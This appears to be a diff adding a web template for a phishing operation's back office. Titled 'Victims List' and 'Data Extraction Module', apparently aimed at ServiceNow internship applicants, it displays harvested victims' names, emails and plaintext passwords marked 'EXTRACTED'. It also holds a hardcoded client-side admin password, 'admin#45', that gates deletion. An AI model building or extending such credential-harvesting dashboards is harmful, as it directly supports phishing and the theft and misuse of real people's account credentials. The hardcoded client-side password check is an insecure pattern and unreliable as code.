@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Victims List</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #00ff00;
+            overflow-x: auto;
+        }
+        
+        .terminal-header {
+            background: #1a1a1a;
+            padding: 10px 20px;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 20px;
+        }
+        
+        .terminal-title {
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .terminal-subtitle {
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: #0a0a0a;
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .data-table th {
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 12px;
+            text-align: left;
+            border-bottom: 2px solid #00ff00;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .data-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #333;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        .data-table tr:hover {
+            background: #1a1a1a;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+        }
+        
+        .data-table tr:nth-child(even) {
+            background: #0f0f0f;
+        }
+        
+        .data-table tr:nth-child(even):hover {
+            background: #1a1a1a;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00ff00;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .stats-bar {
+            background: #1a1a1a;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #00ff00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+        }
+        
+        .console-output {
+            background: #0a0a0a;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #00ff00;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .console-line {
+            margin: 2px 0;
+        }
+        
+        .timestamp {
+            color: #888;
+        }
+        
+        .success {
+            color: #00ff00;
+        }
+        
+        .warning {
+            color: #ffff00;
+        }
+        
+        .error {
+            color: #ff0000;
+        }
+
+        /* Simple online users display with different color */
+        .online-users-badge {
+            background: #2a0a2a;
+            border: 1px solid #ff00ff;
+            border-radius: 6px;
+            padding: 8px 12px;
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 15px;
+            box-shadow: 0 0 8px rgba(255, 0, 255, 0.3);
+        }
+
+        .online-dot {
+            width: 6px;
+            height: 6px;
+            background: #ff00ff;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 5px #ff00ff; }
+            to { box-shadow: 0 0 15px #ff00ff, 0 0 20px #ff00ff; }
+        }
+
+        .online-text {
+            color: #ff00ff;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .online-count {
+            color: #ff00ff;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+
+        /* Credential styling with different colors */
+        .credential-email {
+            color: #00ffff;
+            font-weight: bold;
+        }
+
+        .credential-password {
+            color: #ff6600;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal-header">
+        <div class="terminal-title">
+            <span class="status-indicator"></span>
+            VICTIMS DATABASE - ACTIVE CONNECTION
+        </div>
+        <div class="terminal-subtitle">
+            ServiceNow CAD Internship Cohort 2 - Data Extraction Module
+        </div>
+    </div>
+    
+    <!-- Simple online users display -->
+    <div class="online-users-badge">
+        <div class="online-dot"></div>
+        <span class="online-text">Online Users:</span>
+        <span class="online-count" id="onlineCount"><%= activeUsers %></span>
+    </div>
+    
+    <div class="stats-bar">
+        <div class="stat-item">
+            <div class="stat-number"><%= activeUsers %></div>
+            <div class="stat-label">Active Users</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number"><%= victims.length %></div>
+            <div class="stat-label">Total Records</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number">100%</div>
+            <div class="stat-label">Success Rate</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number">Online</div>
+            <div class="stat-label">Database Status</div>
+        </div>
+    </div>
+    
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>First Name</th>
+                <th>Last Name</th>
+                <th>Email Address</th>
+                <th>Password Hash</th>
+                <th>Submitted At</th>
+                <th>Status</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% victims.forEach((victim, index) => { %>
+            <tr>
+                <td>#<%= String(index + 1).padStart(3, '0') %></td>
+                <td><%= victim.firstName %></td>
+                <td><%= victim.lastName %></td>
+                <td class="credential-email"><%= victim.email %></td>
+                <td class="credential-password"><%= victim.password %></td>
+                <td><%= victim.submittedAt.toLocaleString() %></td>
+                <td><span class="success">EXTRACTED</span></td>
+            </tr>
+            <% }); %>
+        </tbody>
+    </table>
+    
+    <div class="console-output">
+        <div class="console-line">
+            <span class="timestamp">[<%= new Date().toLocaleTimeString() %>]</span> 
+            <span class="success">SUCCESS:</span> Database connection established
+        </div>
+        <div class="console-line">
+            <span class="timestamp">[<%= new Date().toLocaleTimeString() %>]</span> 
+            <span class="success">SUCCESS:</span> Retrieved <%= victims.length %> records from victims collection
+        </div>
+        <div class="console-line">
+            <span class="timestamp">[<%= new Date().toLocaleTimeString() %>]</span> 
+            <span class="warning">WARNING:</span> Displaying sensitive data - Access restricted to authorized personnel only
+        </div>
+        <div class="console-line">
+            <span class="timestamp">[<%= new Date().toLocaleTimeString() %>]</span> 
+            <span class="success">SUCCESS:</span> Data extraction completed successfully
+        </div>
+    </div>
+    
+    <div class="action-buttons">
+        <h3>Actions</h3>
+        <form id="deleteForm" onsubmit="return confirmDelete();">
+            <input type="password" id="adminPassword" placeholder="Enter Admin Password" required />
+            <button type="submit">Delete Selected</button>
+        </form>
+    </div>
+    
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        socket.on('activeUsers', (count) => {
+            document.querySelector('.stat-number').innerText = count; // Update active users count
+        });
+
+        function confirmDelete() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === 'admin#45') {
+                // Proceed with deletion logic
+                // You can add AJAX call here to delete selected victims
+                alert('Password correct. Proceeding with deletion.');
+                return true; // Allow form submission
+            } else {
+                alert('Incorrect password.');
+                return false; // Prevent form submission
+            }
+        }
+    </script>
+</body>
+</html>
